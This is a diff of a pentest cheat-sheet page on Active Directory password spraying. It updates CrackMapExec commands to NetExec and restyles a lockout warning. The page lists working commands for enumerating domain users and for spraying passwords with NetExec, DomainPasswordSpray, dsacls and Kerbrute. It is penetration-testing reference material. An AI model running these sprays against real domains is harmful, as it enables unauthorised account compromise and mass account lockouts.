@@ -17,15 +17,14 @@ permalink: /ad/spraying/
 
 ---
 
-## Disclaimer
-
-This exploit can **lock** a large amount of - or even all - domain accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.
+{: .warning }
+> This exploit can **lock** a large amount of - or even all - domain accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.
 
 ## Vulnerability
 
 For this attack, vulnerability isn't technical. It is simply humans too lazy to put strong and unique passwords.
 
-Password spraying consist in trying a very few passwords for a large amount of potential usernames. It is kind of the opposite of [bruteforce](/ad/bruteforce/), where you attempt many passwords.
+Password spraying consist in trying a very few passwords for a large amount of potential usernames. It is kind of the opposite of [Active Directory brute-force attack](/ad/bruteforce/), where you attempt many passwords.
 
 ## Prerequisites
 
@@ -37,13 +36,13 @@ Password spraying consist in trying a very few passwords for a large amount of p
 To perform password spraying on a domain, target a domain controller or a domain joined computer if you can't access a domain controller. If you already have an initial footprint on the domain, just run one of the following commands to get usernames.
 
 ```bash
-# From Kali.
-cme smb $dc_ip -d $domain -u $username -p $password --users
+# With NetExec (https://github.com/Pennyw0rth/NetExec).
+nxc smb $dc_ip -d $domain -u $username -p $password --users
 
 # From a domain joined Windows computer.
 net user /domain
 
-# From a domain joined computer with DomainPasswordSpray PowerShell module.
+# From a domain joined computer with DomainPasswordSpray PowerShell module (https://github.com/dafthack/DomainPasswordSpray).
 Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
 ```
 
@@ -53,13 +52,13 @@ Usernames often have the same nomenclature like `f.lastname` or `firstname.lastn
 
 ```bash
 # Try the same password for every username.
-cme smb $target -d $domain -u usernames.txt -p $password
+nxc smb $target -d $domain -u usernames.txt -p $password
 
 # Try multiple passwords for every username.
-cme smb $target -d $domain -u usernames.txt -p passwords.txt
+nxc smb $target -d $domain -u usernames.txt -p passwords.txt
 
 # Try line by line (username1 with password1, username2 with password2, etc.).
-cme smb $target -d $domain -u usernames.txt -p passwords.txt --no-bruteforce
+nxc smb $target -d $domain -u usernames.txt -p passwords.txt --no-bruteforce
 
 # From a domain joined computer with DomainPasswordSpray PowerShell module.
 Invoke-DomainPasswordSpray -Password $password
@@ -67,7 +66,7 @@ Invoke-DomainPasswordSpray -Password $password
 # From a domain joined computer using dsacls.exe built-in binary.
 dsacls.exe "$distinguishedname" /user:$username@$domain /passwd:$password
 
-# From a domain joined computer using Kerbrute.
+# From a domain joined computer using Kerbrute (https://github.com/ropnop/kerbrute).
 ./Kerbrute.exe passwordspray -d $domain usernames.txt $password
 ```
 
